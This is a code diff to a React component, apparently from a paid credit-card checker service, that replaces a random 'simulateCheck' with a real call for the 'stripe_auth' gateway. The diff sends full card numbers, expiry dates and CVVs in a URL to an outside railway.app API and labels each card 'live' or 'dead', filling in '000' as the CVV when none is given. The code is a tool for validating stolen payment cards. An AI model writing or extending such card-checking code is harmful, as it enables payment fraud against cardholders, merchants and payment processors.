@@ -456,6 +456,34 @@ const Gateways = () => {
     return true;
   };
 
+  // Real API check for YunChi Auth gateway
+  const checkCardViaApi = async (cardNumber: string, month: string, year: string, cvv: string): Promise<"live" | "dead" | "unknown"> => {
+    try {
+      const cc = `${cardNumber}|${month}|20${year}|${cvv}`;
+      const response = await fetch(`https://stripe-auth-api-production.up.railway.app/api?cc=${encodeURIComponent(cc)}`);
+      
+      if (!response.ok) {
+        console.error('API response not ok:', response.status);
+        return "unknown";
+      }
+      
+      const data = await response.json();
+      console.log('API response:', data);
+      
+      if (data.status === "SUCCESS") {
+        return "live";
+      } else if (data.status === "FAILED") {
+        return "dead";
+      } else {
+        return "unknown";
+      }
+    } catch (error) {
+      console.error('API check error:', error);
+      return "unknown";
+    }
+  };
+
+  // Fallback simulation for non-API gateways
   const simulateCheck = async (): Promise<"live" | "dead" | "unknown"> => {
     await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 700));
     const random = Math.random();
@@ -495,10 +523,13 @@ const Gateways = () => {
         throw new Error("Failed to deduct credits");
       }
 
-      const checkStatus = await simulateCheck();
-
       // For auth gateways, use 000 as CVV internally if not provided
       const internalCvv = cvv || "000";
+
+      // Use real API for YUNCHI AUTH gateway, simulation for others
+      const checkStatus = selectedGateway.id === "stripe_auth"
+        ? await checkCardViaApi(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv)
+        : await simulateCheck();
       const fullCardString = `${cardNumber.replace(/\s/g, '')}|${expMonth}|${expYear}|${internalCvv}`;
       // Display card as entered by user (without auto-added CVC)
       const displayCardString = cvv 
@@ -1096,7 +1127,10 @@ const Gateways = () => {
         currentCredits -= CREDIT_COST;
         setUserCredits(currentCredits);
 
-        const checkStatus = await simulateCheck();
+        // Use real API for YUNCHI AUTH gateway, simulation for others
+        const checkStatus = selectedGateway.id === "stripe_auth"
+          ? await checkCardViaApi(cardData.card, cardData.month, cardData.year, cardData.cvv)
+          : await simulateCheck();
 
         const fullCardStr = `${cardData.card}|${cardData.month}|${cardData.year}|${cardData.cvv}`;
         // Display card as entered by user (without auto-added CVC)
